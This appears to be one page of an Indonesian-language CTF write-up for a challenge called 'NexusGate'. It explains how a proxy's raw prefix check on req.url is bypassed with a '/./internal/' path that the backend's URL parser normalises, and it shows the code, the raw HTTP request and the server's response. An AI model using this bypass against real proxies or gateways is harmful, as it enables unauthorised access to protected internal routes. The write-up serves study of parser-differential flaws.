# NexusGate — ACL bypass: raw `req.url` vs `new URL()`

[← Overview](50-nexusgate.md) · [Index](index.md)

> **Langkah 3/12 — ACL bypass: raw `req.url` vs `new URL()`.** Respons mentah (chunked):
>
> **Titik penting:** http://127.0.0.1:8080' · 127.0.0.1:8080
>
> **Berikutnya:** [Cursor over-grant → PHASE_TOKEN](50-nexusgate-04-cursor-over-grant-phase-token.md)

## 2.1 ACL bypass: raw `req.url` vs `new URL()`

`proxy.js`:

```js
const server = http.createServer({ maxHeaderSize: 128 * 1024 }, (req, res) => {
  // ---- 1. path ACL ----
  if (req.url.startsWith('/internal/')) {
    res.writeHead(403, { 'content-type': 'text/plain' });
    res.end('forbidden');
    return;
  }
  ...
  const breq = http.request({
    host: BACKEND_HOST,
    port: BACKEND_PORT,
    method: req.method,
    path: req.url,          // raw, mis. /./internal/...
    headers,
    agent,
  }, ...);
  req.pipe(breq);
});
```

Backend `routes.js`:

```js
function handleRequest(req, res) {
  const url = new URL(req.url, 'http://127.0.0.1:8080');
  const pathname = url.pathname;
  ...
  if (pathname === '/internal/console/cursor') { ... }
}
```

- Proxy melihat `req.url = "/./internal/console/cursor"` → tidak diawali `/internal/` → **lolos**.
- Backend memanggil `new URL("/./internal/console/cursor", ...)` → WHATWG URL parser menghapus segmen `.` → `pathname = "/internal/console/cursor"` → **route internal dieksekusi**.
- Ini adalah perbedaan parser klasik: string prefix check vs URL normalization.

Raw request:

```http
GET /./internal/console/cursor?id=x HTTP/1.1
Host: s1.nfx.my.id:49535
Connection: close
```

Respons mentah (chunked):

```text
HTTP/1.1 400 Bad Request
content-type: application/json; charset=utf-8
...
{"err":"no such cursor"}
```

### Evidence langkah ini

![term-source-notes.png](assets/nexusgate/term-source-notes.png)

*Terminal evidence — `source-notes.txt` (arsip transkrip sesi solve).*

**Berkas mentah langkah ini:**

- [`source-notes.txt`](assets/nexusgate/source-notes.txt)
